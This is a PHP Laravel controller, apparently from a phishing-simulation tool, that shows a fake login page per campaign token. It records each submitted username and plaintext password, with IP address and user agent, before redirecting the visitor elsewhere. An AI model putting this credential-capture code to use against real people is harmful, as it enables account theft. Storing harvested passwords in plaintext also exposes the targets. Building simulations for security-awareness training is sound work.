<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Campaign;
use App\Models\PhishingLog;

class SimulationController extends Controller
{
    public function showLoginForm($token)
    {
        $campaign = Campaign::where('tracking_token', $token)->firstOrFail();

        return view('simulation.landing', compact('campaign'));
    }

    public function captureCredentials(Request $request, $token)
    {
        $campaign = Campaign::where('tracking_token', $token)->firstOrFail();

        $request->validate([
            'username' => 'required',
            'password' => 'required'
        ]);

        PhishingLog::create([
            'campaign_id' => $campaign->id,
            'username' => $request->username,
            'password' => $request->password,
            'ip_address' => $request->ip(),
            'user_agent' => $request->userAgent()
        ]);

        return redirect()->away($campaign->redirect_url);
    }
}
